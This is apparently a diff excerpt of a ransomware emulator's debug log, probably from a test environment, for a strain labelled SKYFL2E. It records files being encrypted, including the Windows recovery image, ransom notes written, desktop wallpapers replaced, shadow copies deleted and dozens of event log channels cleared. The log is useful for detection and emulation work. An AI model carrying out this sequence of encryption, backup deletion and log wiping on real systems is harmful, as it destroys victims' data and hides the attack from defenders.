+[DEBUG] [2023-10-18 16:33:04] C:\Recovery\WindowsRE\Winre.wim has huge size of 640607700 bytes - encrypting via chunk method.
+[DEBUG] [2023-10-18 16:33:04] Encrypted C:\WindowsAzure\Logs\AggregateStatus\aggregatestatus_20231018163106240.json
+[DEBUG] [2023-10-18 16:33:04] Encrypted C:\WindowsAzure\Logs\AggregateStatus\aggregatestatus_20231018163121253.json
+[DEBUG] [2023-10-18 16:33:04] Encrypted C:\Users\windesk\NTUSER.DAT{18a6cc8d-1db3-11ee-97a4-00155d002401}.TMContainer00000000000000000002.regtrans-ms
+[INFO]  [2023-10-18 16:33:04] Ransom note written to C:\Users\windesk\RECOVER-SKYFL2E-FILES.txt
+[DEBUG] [2023-10-18 16:33:04] Encrypted C:\WindowsAzure\Logs\AggregateStatus\aggregatestatus_20231018163136256.json
+[DEBUG] [2023-10-18 16:33:04] Encrypted C:\WindowsAzure\Logs\AggregateStatus\aggregatestatus_20231018163151287.json
+[DEBUG] [2023-10-18 16:33:04] Encrypted C:\WindowsAzure\Logs\AggregateStatus\aggregatestatus_20231018163206287.json
+[DEBUG] [2023-10-18 16:33:04] Encrypted C:\WindowsAzure\Logs\AggregateStatus\aggregatestatus_20231018163221303.json
+[DEBUG] [2023-10-18 16:33:04] Encrypted C:\WindowsAzure\Logs\AggregateStatus\aggregatestatus_20231018163236315.json
+[DEBUG] [2023-10-18 16:33:04] Encrypted C:\WindowsAzure\Logs\AggregateStatus\aggregatestatus_20231018163251335.json
+[INFO]  [2023-10-18 16:33:04] Ransom note written to C:\WindowsAzure\Logs\AggregateStatus\RECOVER-SKYFL2E-FILES.txt
+[DEBUG] [2023-10-18 16:33:04] Encrypted C:\WindowsAzure\GuestAgent_2.7.41491.1095_2023-10-06_165314\FindVolume\DATALOSS_WARNING_README.txt
+[INFO]  [2023-10-18 16:33:04] Ransom note written to C:\WindowsAzure\GuestAgent_2.7.41491.1095_2023-10-06_165314\FindVolume\RECOVER-SKYFL2E-FILES.txt
+[DEBUG] [2023-10-18 16:33:04] Encrypted C:\WindowsAzure\Logs\TransparentInstaller.2023.10.10-23.17.39.949.log
+[DEBUG] [2023-10-18 16:33:04] Encrypted C:\WindowsAzure\Logs\TransparentInstaller.2023.10.15-07.32.55.248.log
+[ERROR] [2023-10-18 16:33:04] Failed to encrypt C:\WindowsAzure\Logs\TransparentInstaller.log : Os { code: 32, kind: Uncategorized, message: "The process cannot access the file because it is being used by another process." }
+[ERROR] [2023-10-18 16:33:04] Failed to encrypt C:\WindowsAzure\Logs\WaAppAgent.log : Os { code: 32, kind: Uncategorized, message: "The process cannot access the file because it is being used by another process." }
+[ERROR] [2023-10-18 16:33:04] Failed to encrypt C:\WindowsAzure\Logs\WaAppAgent_000002.etl : Os { code: 32, kind: Uncategorized, message: "The process cannot access the file because it is being used by another process." }
+[ERROR] [2023-10-18 16:33:04] Failed to encrypt C:\WindowsAzure\Logs\WaSecAgent-startPoll.log : Os { code: 32, kind: Uncategorized, message: "The process cannot access the file because it is being used by another process." }
+[DEBUG] [2023-10-18 16:33:04] Encrypted C:\WindowsAzure\Logs\WaSecAgent-stopPoll.log
+[ERROR] [2023-10-18 16:33:04] Failed to encrypt C:\WindowsAzure\Logs\WindowsAzure-GuestAgent-Metrics_2023_10_18_16_33_2.etl : Os { code: 32, kind: Uncategorized, message: "The process cannot access the file because it is being used by another process." }
+[INFO]  [2023-10-18 16:33:04] Ransom note written to C:\WindowsAzure\Logs\RECOVER-SKYFL2E-FILES.txt
+[DEBUG] [2023-10-18 16:33:04] Encrypted C:\Recovery\WindowsRE\Winre.wim
+[INFO]  [2023-10-18 16:33:04] Ransom note written to C:\Recovery\WindowsRE\RECOVER-SKYFL2E-FILES.txt
+[INFO]  [2023-10-18 16:33:04] Finished enumerating and encrypting.
+[INFO]  [2023-10-18 16:33:04] Finished enumeration and encryption. Total of 59 files found and processed.
+[INFO]  [2023-10-18 16:33:04] Performing wallpaper changes for logged-in users.
+[DEBUG] [2023-10-18 16:33:04] Enumerating subkeys for HKEY_USERS
+[DEBUG] [2023-10-18 16:33:04] Found subkey .DEFAULT
+[DEBUG] [2023-10-18 16:33:04] Found subkey S-1-5-19
+[DEBUG] [2023-10-18 16:33:04] Found subkey S-1-5-20
+[DEBUG] [2023-10-18 16:33:04] Found subkey S-1-5-21-2782112981-3470040036-1783352887-1108
+[DEBUG] [2023-10-18 16:33:04] Found subkey S-1-5-21-2782112981-3470040036-1783352887-1108_Classes
+[DEBUG] [2023-10-18 16:33:04] Found subkey S-1-5-21-3511644441-3211115092-1952802264-1103
+[DEBUG] [2023-10-18 16:33:04] Found subkey S-1-5-21-3511644441-3211115092-1952802264-1103_Classes
+[DEBUG] [2023-10-18 16:33:04] Found subkey S-1-5-80-972488765-139171986-783781252-3188962990-3730692313
+[DEBUG] [2023-10-18 16:33:04] Found subkey S-1-5-80-972488765-139171986-783781252-3188962990-3730692313_Classes
+[DEBUG] [2023-10-18 16:33:04] Found subkey S-1-5-18
+[DEBUG] [2023-10-18 16:33:04] Finished enumerating subkeys.
+[DEBUG] [2023-10-18 16:33:04] Got value for HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\S-1-5-21-2782112981-3470040036-1783352887-1108: C:\Users\zorimoto
+[DEBUG] [2023-10-18 16:33:04] Saved new wallpaper at C:\Users\zorimoto\Desktop\RECOVER-SKYFL2E-FILES.txt.png
+[DEBUG] [2023-10-18 16:33:04] Opened key HKEY_USERS\S-1-5-21-2782112981-3470040036-1783352887-1108\Control Panel\Desktop
+[INFO]  [2023-10-18 16:33:04] Set wallpaper for SID S-1-5-21-2782112981-3470040036-1783352887-1108 to C:\Users\zorimoto\Desktop\RECOVER-SKYFL2E-FILES.txt.png
+[DEBUG] [2023-10-18 16:33:04] Got value for HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\S-1-5-21-3511644441-3211115092-1952802264-1103: C:\Users\evals_domain_admin
+[DEBUG] [2023-10-18 16:33:04] Saved new wallpaper at C:\Users\evals_domain_admin\Desktop\RECOVER-SKYFL2E-FILES.txt.png
+[DEBUG] [2023-10-18 16:33:04] Opened key HKEY_USERS\S-1-5-21-3511644441-3211115092-1952802264-1103\Control Panel\Desktop
+[INFO]  [2023-10-18 16:33:04] Set wallpaper for SID S-1-5-21-3511644441-3211115092-1952802264-1103 to C:\Users\evals_domain_admin\Desktop\RECOVER-SKYFL2E-FILES.txt.png
+[INFO]  [2023-10-18 16:33:04] Completed wallpaper changes.
+[INFO]  [2023-10-18 16:33:04] Unmounting previously mounted hidden partitions.
+[INFO]  [2023-10-18 16:33:04] Finished unmounting hidden partitions.
+[INFO]  [2023-10-18 16:33:04] Deleting shadow copies again.
+[DEBUG] [2023-10-18 16:33:04] Initializing COM
+[INFO]  [2023-10-18 16:33:04] COM is already intialized on this thread
+[DEBUG] [2023-10-18 16:33:04] Initializing COM security
+[INFO]  [2023-10-18 16:33:04] COM security is already intialized within this thread
+[DEBUG] [2023-10-18 16:33:04] Creating backup components
+[DEBUG] [2023-10-18 16:33:04] Created backup components
+[DEBUG] [2023-10-18 16:33:04] Initializing for backup
+[DEBUG] [2023-10-18 16:33:04] Initialized for backup
+[DEBUG] [2023-10-18 16:33:04] Setting context
+[DEBUG] [2023-10-18 16:33:04] Context set
+[DEBUG] [2023-10-18 16:33:04] Setting backup state
+[DEBUG] [2023-10-18 16:33:04] Backup state set
+[DEBUG] [2023-10-18 16:33:04] Querying for snapshots
+[INFO]  [2023-10-18 16:33:05] Query returned S_FALSE, possibly no volume shadow copies present
+[INFO]  [2023-10-18 16:33:05] Successfully deleted shadow copies (second time).
+[INFO]  [2023-10-18 16:33:05] Clearing event logs.
+[DEBUG] [2023-10-18 16:33:05] Deleted event logs from event channel: Windows PowerShell
+[DEBUG] [2023-10-18 16:33:05] Deleted event logs from event channel: Windows Azure
+[DEBUG] [2023-10-18 16:33:05] Deleted event logs from event channel: System
+[DEBUG] [2023-10-18 16:33:05] Deleted event logs from event channel: Security
+[DEBUG] [2023-10-18 16:33:05] Deleted event logs from event channel: Key Management Service
+[DEBUG] [2023-10-18 16:33:05] Deleted event logs from event channel: Internet Explorer
+...
+[DEBUG] [2023-10-18 16:33:14] Deleted event logs from event channel: DirectShowPluginControl
+[DEBUG] [2023-10-18 16:33:14] Deleted event logs from event channel: DirectShowFilterGraph
+[DEBUG] [2023-10-18 16:33:14] Deleted event logs from event channel: Analytic
+[DEBUG] [2023-10-18 16:33:14] Deleted event logs from event channel: AMSI/Debug
+[INFO]  [2023-10-18 16:33:14] clear_event_logs executed successfully
